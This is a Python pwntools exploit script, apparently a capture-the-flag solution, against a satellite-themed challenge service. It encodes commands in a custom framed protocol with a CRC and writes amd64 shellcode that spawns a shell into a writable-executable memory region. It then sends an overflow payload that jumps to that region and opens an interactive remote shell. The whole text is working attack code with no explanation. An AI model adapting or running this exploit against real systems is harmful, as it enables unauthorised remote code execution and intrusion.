# requirements: pip3 install pwntools
from pwn import *

def crc(data):
    h = 0x1d0f
    for b in data:
        h = h ^ (b << 8)
        for i in range(8):
            if (h & 0x8000) == 0:
                h <<= 1
            else:
                h = (h + h) ^ 0xa02b
    return h & 0xffff

def make_cmd(y, x, data):
    buf = bytearray(8)
    struct.pack_into("B",  buf, 0, 0x55)
    struct.pack_into("B",  buf, 1, 0xaa)
    struct.pack_into("<H", buf, 2, len(data))
    struct.pack_into("<H", buf, 4, crc(data))
    struct.pack_into("B",  buf, 6, y)
    struct.pack_into("B",  buf, 7, x)
    buf += data
    return buf

def recv_cmd(r, exp_y=None, exp_x=None):
    buf = r.recvn(8)
    m55  = struct.unpack_from("B",  buf, 0)[0]
    mAA  = struct.unpack_from("B",  buf, 1)[0]
    size = struct.unpack_from("<H", buf, 2)[0]
    h    = struct.unpack_from("<H", buf, 4)[0]
    y    = struct.unpack_from("B",  buf, 6)[0]
    x    = struct.unpack_from("B",  buf, 7)[0]
    data = r.recvn(size)
    assert(m55 == 0x55)
    assert(mAA == 0xAA)
    #assert(size == len(data))
    assert(h == crc(data))
    if exp_y != None:
        assert(exp_y == y)
    if exp_x != None:
        assert(exp_x == x)
    return data

def cmd_write_rwx(r, off, data):
    buf = bytearray(4)
    struct.pack_into("<H", buf, 0, off)
    struct.pack_into("<H", buf, 2, len(data))
    buf += data
    r.send(make_cmd(2, 1, buf))

def cmd_read_rwx(r, off, size):
    buf = bytearray(4)
    struct.pack_into("<H", buf, 0, off)
    struct.pack_into("<H", buf, 2, size)
    r.send(make_cmd(2, 0, buf))
    data = recv_cmd(r, 0, 0)
    assert(len(data) == size)
    return data

def main():
    context.binary = ELF('./challenge')
    context.log_level = 'debug'
    r_pre = remote("wealthy-rock.satellitesabove.me", 5010)
    ticket = "<your ticket here>"
    r_pre.readline() # "ticket please"
    r_pre.sendline(ticket)

    addr_line = r_pre.readline() # Starting up Service on tcp:3.134.99.70:27993
    addr = addr_line.decode().split(" ")[-1]
    addr = addr[4:]
    ip, port = addr.split(":")

    r = remote(ip, port)
    
    sc = asm(pwnlib.shellcraft.amd64.linux.sh())
    cmd_write_rwx(r, 0x0, sc)
    
    addr = 0x12800000
    payload = b"\x00\x00\x00\x00" * 3 + struct.pack("<Q", addr) * 50
    r.send(make_cmd(1, 1, payload))
    
    context.log_level = "info"
    
    r.interactive()

    r.close()
    r_pre.close()

if __name__ == "__main__":
    main()